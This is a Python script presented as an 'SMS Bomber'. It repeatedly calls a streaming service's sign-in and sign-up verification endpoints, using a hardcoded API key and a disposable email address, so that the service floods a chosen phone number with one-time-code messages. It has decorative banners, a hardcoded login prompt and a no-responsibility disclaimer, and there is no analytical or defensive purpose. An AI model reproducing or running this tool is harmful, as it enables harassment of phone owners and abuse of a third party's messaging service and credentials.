import requests as rq

blue= '\33[94m'
lightblue = '\033[94m'
red = '\033[91m'
white = '\33[97m'
yellow = '\33[93m'
green = '\033[1;32m'
cyan  = "\033[96m"
end = '\033[0m'
purple="\033[0;35m"


import os
os.system("clear")


line=red+"Note: I won't be responsible fo any damage caused by this script. Use at your own risk."
space=" "
print (green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
            
text=lightblue+"\t\t𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲:"+yellow+"𝐌𝐃 𝐓𝐀𝐒𝐑𝐈𝐅 𝐇𝐎𝐒𝐒𝐄𝐍"+cyan+"\n\n\t\t★★ "+purple+"TASRIF MULTIMEDIA"+cyan+"★★   \n" 
notice=""     
def header():
 print(text)
 print(line)
 print(notice)

#SECURITY    
header()
print(red+"___________________________________________________________")
print("\t\tYour Must Log In first")
print("----------------------------------------------------------‌-")
n=2
while n==2:
  a=str(input(cyan+"\n\n\t\t[>] Username : "+green))
  b=str(input(cyan+"\n\n\t\t[>] Password : "+green))
  if a=="TASRIF" and b=="MULTIMEDIA":
   print(green+"\n\n\t\t[ √ ] Request Accepted")
   n=3
  else:
   
   print(red+"\n\n\t\t[ × ] Incorrect Password/Username!\n\t\tPlease Try Again")
   n=2
   
  
import requests as rq

import os
os.system("clear")

line=red+"Note: I won't be responsible fo any damage caused by this script. Use at your own risk."
space=" "

print (green+"""
  _______ __  __   ____   ____  __  __ ____  ______ _____  
 |__   __|  \/  | |  _ \ / __ \|  \/  |  _ \|  ____|  __ \ 
    | |  | \  / | | |_) | |  | | \  / | |_) | |__  | |__) |
    | |  | |\/| | |  _ <| |  | | |\/| |  _ <|  __| |  _  / 
    | |  | |  | | | |_) | |__| | |  | | |_) | |____| | \ \ 
    |_|  |_|  |_| |____/ \____/|_|  |_|____/|______|_|  \_\
            """)
            
text=lightblue+"\t\t𝐂𝐫𝐞𝐚𝐭𝐞𝐝 𝐁𝐲:"+yellow+"𝐌𝐃 𝐓𝐀𝐒𝐑𝐈𝐅 𝐇𝐎𝐒𝐒𝐄𝐍"+cyan+"\n\n\t\t★★ "+purple+"TASRIF MULTIMEDIA"+cyan+"★★   \n" 
notice=""     
def header():
 print(text)
 print(line)
 print(notice)
 
header()

print ('	')



"""

SMS Bomber using Hoichoi SMS api
"""

def send(target):
  header = {
    "x-api-key": "dtGKRIAd7y3mwmuXGk63u3MI3Azl1iYX8w9kaeg3"
  }

  data = {
    "requestType":"send",
    "phoneNumber":"+88"+target,
    "screenName":"signin"
  }

  url = "https://prod-api.viewlift.com/identity/signin?site=hoichoitv&deviceId=browser-44067eab-5337-99d8-11eb-99ca1e4db186"
  res = rq.post(url, json=data, headers=header)
  if res.json().get("code"):
    data = {
      "requestType":"send",
      "phoneNumber":"+88"+target,
      "emailConsent":"true",
      "whatsappConsent":"true",
      "email":"cicas94417@iconmle.com"
    }
    url = "https://prod-api.viewlift.com/identity/signup?site=hoichoitv"

    res = rq.post(url, json=data, headers=header)
    if not res.json().get("sent"): return False
  return True

def main():
  target = input(green+"➢ Enter Target Number: ")
  amount = int(input(purple+"➢ Enter Amount: "))
  sent, nsent = 0, amount
  for i in range(1, amount + 1):
    try:
      if send(target):
        print(f"➢[{i}] SMS Sent ✅")
        sent += 1
        nsent -= 1
      else:
        print(f"➢[{i}] SMS Not Sent❌")
    except KeyboardInterrupt: break
    except Exception as e: print(e); break
  print(f"\n[*] Total Target: {amount}\n[+] Sent✅: {sent}\n[-] Not Sent ❌: {nsent}")

if __name__ == "__main__":
  main()
